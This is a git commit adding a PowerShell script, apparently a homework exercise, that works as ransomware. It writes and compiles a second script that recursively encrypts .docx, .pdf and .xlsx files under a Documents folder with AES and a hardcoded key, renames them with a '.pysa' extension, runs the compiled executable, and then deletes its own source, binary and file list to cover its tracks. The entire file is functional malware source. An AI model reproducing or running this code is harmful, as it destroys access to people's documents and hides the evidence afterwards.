8da01aef1079159a6f14a280473830e773de7432
Berrym-tech <71224774+Berrym-tech@users.noreply.github.com>
2022-12-06 12:01:50 -0500

    Add files via upload

---
+++ Homework/step1.ps1
@@ -0,0 +1,111 @@
+$writeEncryption = @'
+function Invoke-AESEncryption {
+    [CmdletBinding()]
+    [OutputType([string])]
+    Param
+    (
+        [Parameter(Mandatory = $true)]
+        [ValidateSet('Encrypt', 'Decrypt')]
+        [String]$Mode,
+        [Parameter(Mandatory = $true)]
+        [String]$Key,
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
+        [String]$Text,
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
+        [String]$Path
+    )
+    Begin {
+        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
+        $aesManaged = New-Object System.Security.Cryptography.AesManaged
+        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $aesManaged.BlockSize = 128
+        $aesManaged.KeySize = 256
+    }
+    Process {
+        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+        switch ($Mode) {
+            'Encrypt' {
+                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName + ".pysa"
+                }
+                $encryptor = $aesManaged.CreateEncryptor()
+                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+                $encryptedBytes = $aesManaged.IV + $encryptedBytes
+                $aesManaged.Dispose()
+                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File encrypted to $outPath"
+                }
+            }
+            'Decrypt' {
+                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName -replace ".aes"
+                }
+                $aesManaged.IV = $cipherBytes[0..15]
+                $decryptor = $aesManaged.CreateDecryptor()
+                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
+                $aesManaged.Dispose()
+                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File decrypted to $outPath"
+                }
+            }
+        }
+    }
+    End {
+        $shaManaged.Dispose()
+        $aesManaged.Dispose()
+    }
+}
+Get-ChildItem -Recurse -Include *.docx,*.pdf,*.xlsx -Path .\Documents\ | Export-Csv `
+-Path .\files.csv
+$fileList = Import-Csv .\files.csv -Header FullName
+# Loop through the results
+foreach ($f in $fileList) {
+    # Get-ChildItem -Path $f.FullName
+    Invoke-AESEncryption -Mode Encrypt -Key "B@se" -Path $f.FullName
+}
+'@
+
+# Directory where the malicious code will be written to.
+# $sbDir = 'C:\Users\maxbe\Python Code\Week 13\Homework'
+# Location where the malicous code will be saved to
+$file = "step2.ps1"
+# Write a file
+$writeEncryption | Out-File -FilePath $file
+
+$del = @'
+del .\step2.ps1
+del .\step2.exe
+del .\files.csv
+'@
+
+$update = "update.bat"
+$del | Out-File -FilePath $update
+Invoke-ps2exe $file
+Remove-Item $file
+Invoke-Expression ".\step2.exe"
+Invoke-Expression ".\update.bat"
